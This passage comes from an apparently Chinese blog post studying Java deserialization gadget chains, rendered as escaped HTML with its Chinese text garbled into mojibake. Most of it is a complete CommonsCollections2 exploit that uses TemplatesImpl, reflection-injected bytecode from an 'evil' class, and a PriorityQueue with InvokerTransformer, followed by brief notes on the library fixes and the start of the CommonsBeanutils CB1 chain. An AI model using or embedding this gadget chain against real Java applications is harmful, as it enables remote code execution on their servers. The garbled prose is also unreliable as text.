&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="templatesimpl">TemplatesImpl&lt;/h3>
&lt;p>æŠŠexpæ”¹é€ ä¸ºTemplatesImplçš„æ— transformeræ•°ç»„ç‰ˆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections2TemplatesImpl&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytescode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">clazz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">getBytescode&lt;/span>&lt;span style="color:#f92672">()});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;toString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ä¿®å¤">ä¿®å¤&lt;/h3>
&lt;p>è¿™æ¡CC2æ˜¯cc4é™å®šï¼Œå› ä¸º&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>åœ¨ä¹‹å‰ç‰ˆæœ¬æ˜¯æ²¡æœ‰&lt;code>Serializable&lt;/code>æŽ¥å£çš„ï¼Œæ— æ³•åœ¨åºåˆ—åŒ–ä¸­ä½¿ç”¨&lt;/p>
&lt;p>åœ¨cc3.2.2ç‰ˆä¸­é€šè¿‡æ·»åŠ &lt;code>FunctorUtils#checkUnsafeSerialization&lt;/code>æ¥æ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå¦‚æžœæ²¡æœ‰è®¾ç½®&lt;code>org.apache.commons.collections.enableUnsafeSerialization=true&lt;/code>ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸&lt;/p>
&lt;p>è¿™ä¸ªæ£€æŸ¥åœ¨å¸¸è§çš„å±é™©Transformerç±»ï¼ˆInstantiate, Invoker, Prototype, CloneTransformerï¼‰é‡Œçš„readObjectè°ƒç”¨&lt;/p>
&lt;p>åœ¨cc4.1ç‰ˆä¸­ï¼Œè¿™å‡ ä¸ªç±»æ²¡æœ‰SerializableæŽ¥å£ï¼Œå½»åº•æ— æ³•åºåˆ—åŒ–äº†&lt;/p>
&lt;h2 id="cb1">CB1&lt;/h2>
&lt;p>Commons Beanutilsï¼Œé¡¾åæ€ä¹‰å°è£…äº†å¯¹java beançš„ä¸€äº›æ“ä½œæ–¹æ³•ï¼Œæ¯”å¦‚å¯ä»¥ç›´æŽ¥è°ƒç”¨java beançš„getteræ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Cat&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œä¼šè‡ªåŠ¨æ‰¾åˆ°nameå±žæ€§çš„æ–¹æ³•ï¼Œå³getNameï¼Œé™¤æ­¤ä¹‹å¤–è¿™ä¸ªæ–¹æ³•è¿˜æ”¯æŒé€’å½’èŽ·å–å±žæ€§&lt;/p>
&lt;p>åœ¨ä¸Šé¢çš„CC2ä¸­æˆ‘ä»¬ä½¿ç”¨äº†PriorityQueueï¼Œåœ¨å®ƒçš„æŽ’åºä¸­æ¶‰åŠåˆ°ComparatoræŽ¥å£çš„compareæ–¹æ³•ï¼Œæœ€åŽè§¦å‘transformï¼Œåœ¨CBä¸­ä¹Ÿå­˜åœ¨ä¸€ä¸ªå¯åˆ©ç”¨çš„Comparatorå¯¹è±¡ï¼ŒBeanComparator&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">compare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IllegalAccessException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvocationTargetException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;NoSuchMethodException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
